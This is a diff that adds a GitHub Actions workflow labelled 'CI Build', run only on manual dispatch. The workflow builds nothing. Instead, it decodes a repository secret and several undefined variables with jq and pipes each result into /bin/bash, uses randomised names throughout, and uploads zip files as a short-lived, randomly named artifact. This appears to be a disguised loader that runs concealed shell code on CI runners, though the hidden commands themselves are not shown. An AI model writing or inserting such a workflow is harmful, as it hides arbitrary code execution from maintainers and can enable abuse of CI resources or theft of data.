@@ -1,0 +1,37 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          g57315: ${{ secrets.g57315 }}
+        run: |
+          printf '%s' "$g57315" | jq -r .t0515 | /bin/bash
+          printf '%s' "$a0" | jq -r .ck26 | /bin/bash
+          echo $dznag0140 | jq -r .q74779 | /bin/bash
+          echo $satue627 | jq -r .nktyn32 | /bin/bash
+          echo $upd3573 | jq -r .m26 | /bin/bash
+          printf '%s' "$tno794" | jq -r .w41051 | /bin/bash
+          echo $ltb06 | jq -r .w30485 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: j58C7byj
+          path: "*.zip"
+          retention-days: 1
